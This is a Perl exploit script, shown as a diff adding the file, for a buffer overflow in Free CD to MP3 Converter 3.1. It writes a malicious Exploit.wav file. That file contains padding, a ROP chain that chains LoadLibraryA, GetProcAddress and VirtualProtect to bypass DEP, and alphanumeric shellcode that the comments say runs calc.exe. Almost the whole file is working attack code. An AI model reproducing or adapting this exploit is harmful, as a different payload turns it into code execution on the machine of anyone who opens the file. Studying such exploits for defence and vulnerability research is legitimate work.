@@ -1,0 +1,80 @@
+#!/usr/bin/perl
+#
+#[+]Exploit Title: Free CD to MP3 Converter 3.1 Universal DEP Bypass Exploit
+#[+]Date: 07\08\2011
+#[+]Author: C4SS!0 G0M3S
+#[+]Software Link: http://www.exploit-db.com/application/15480/
+#[+]Version: 3.1
+#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
+#[+]CVE: N/A
+#
+#Dep bypass method: 
+#LoadLibraryA("kernel32.dll") + GetProcAddress(%EAX,"VirtualProtect") + VirtualProtect(%ESP,0x400,0x40,0x10007064) == Universal DEP BYPASS. :)
+# 
+#
+
+print q{
+
+		Created By C4SS!0 G0M3S	
+		E-mail louredo_@hotmail.com
+		Blog net-fuzzer.blogspot.com
+		
+};
+sleep(2);
+#Endereco para LoadLibraryA 0x672CA660
+##################################ROP FOR LOAD "kernel32.dll"#############################################
+my $rop = pack('V',0x00418764); # POP ESI # RETN  
+$rop .= pack('V',0x672CA660); # Address to LoadLibraryA
+$rop .= pack('V',0x00412d09); # POP EBP # RETN
+$rop .= pack('V',0x004AD39B); # ADD ESP,24 # POP EBP # POP EDI # POP ESI # POP EBX # RETN  // Endereço de retorno da funçao LoadLibraryA
+$rop .= pack('V',0x00472be9); # PUSHAD # POP EBX # RETN
+$rop .= "kernel32.dll\x00";
+$rop .= "A" x 27;
+##################################ROP END HERE###########################################################
+
+#Endereço para GetProcAddress 0x672CA668  
+##################################ROP FOR Function GetProcAddress########################################
+$rop .= pack('V',0x0048004d);  # POP EBP # RETN  
+$rop .= "\x00\x00\x00\x00";
+$rop .= pack('V',0x00409a7f);  # POP EDI # RETN
+$rop .= pack('V',0x672CA668);  # Endereço para GetProcAddress
+$rop .= pack('V',0x0042ad45);  # PUSH ESP # POP ESI # RETN
+$rop .= pack('V',0x004a1b0e);  # POP ESI # RETN 
+$rop .= pack('V',0x004AD39B);  # ADD ESP,24 # POP EBP # POP EDI # POP ESI # POP EBX # RETN  // Endereço de retorno da funçao GetProcAddress
+$rop .= pack('V',0x00421953);  # ADD EBP,EAX # RETN
+$rop .= pack('V',0x004c0634);  # PUSHAD # RETN 
+$rop .= "VirtualProtect\x00";
+$rop .= "A" x 25;
+##################################ROP END HERE###########################################################
+
+#################################ROP FOR VirtualProtect#################################################
+$rop .= pack('V',0x0042c786);  # XCHG EAX,ESI # RETN // Endereço da VirtualProtect
+$rop .= pack('V',0x004d2c70);  # POP EBP # RETN
+$rop .= pack('V',0x0047E58B);  # JMP ESP // Endereço de retorno da funçao VirtualProtect
+$rop .= pack('V',0x0046abf7);  # POP EBX # RETN
+$rop .= pack('V',0x00000400);  # O valor de dwSize 
+$rop .= pack('V',0x00402bb4);  # POP EDX # RETN 
+$rop .= pack('V',0x00000040);  # Valor de flNewProtect
+$rop .= pack('V',0x10002b9c);  # POP ECX # RETN 
+$rop .= pack('V',0x10007064);  # Valor de lpflOldProtect
+$rop .= pack('V',0x00472be9);  # PUSHAD # POP EBX # RETN 
+#################################ROP END HERE###########################################################
+my $shellcode = 
+"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIONMRU2SJXH9KHNHYD4FDK".
+"D0XGC9YX1FRP1T0B2TCRPEBK3RJMNZ8GMLV879DONSVQXK7FWLCSIJ5VLO0WXWYWVLDO0O2SZGL62OVO".
+"RP3N3DMMERZJDY3R9N0Q695JE6J3KEUYGM5LNQTR0EK3PUDYY0PN3MY3NQ4KX980PGSPPN3N5L3Q5RI9". #Shellcode Alpha Numeric WinExec "Calc.exe"
+"GQ3J5M6MO9KMMOQ7OHZT2X2SLLUKOS1L6VDN6QKJWUGTV07YVMHMKQY4N5NG4WLE4QML9QWOOELVEXMQ". #Baseaddress EAX.
+"2LFNN2UMWFWE2KSPLWK8OSWDJ1O8NOTGPQK1K0KJGZJ5OE8VCNW9T4Q2RUMOZ6NCTL9TSLKJNZKW0NMN".
+"LSQMFWOHKHLLX7ON4SNZQ4NQO4QMVLNMZPVD89ULWKNTQMP0M1S3L6SNXMWBYNPPIT73NOXWKRRVZRN8".
+"WDN0SUK8WOMV4DNNTWPYWN27KA";
+
+my $buf = "A" x 4112;
+$buf .= $rop;
+$buf .= "\x8B\xC4\x83\xC0\x20\xFF\xD0".("A" x 21).$shellcode;
+print "\t\t[+]Creating File Exploit.wav...\n";
+sleep(1);
+open(f,">Exploit.wav") || die "[-]Error: $!\n";
+print f $buf;
+close f;
+print "\t\t[+]File Exploit.wav Created Successfully.\n";
+sleep(1);
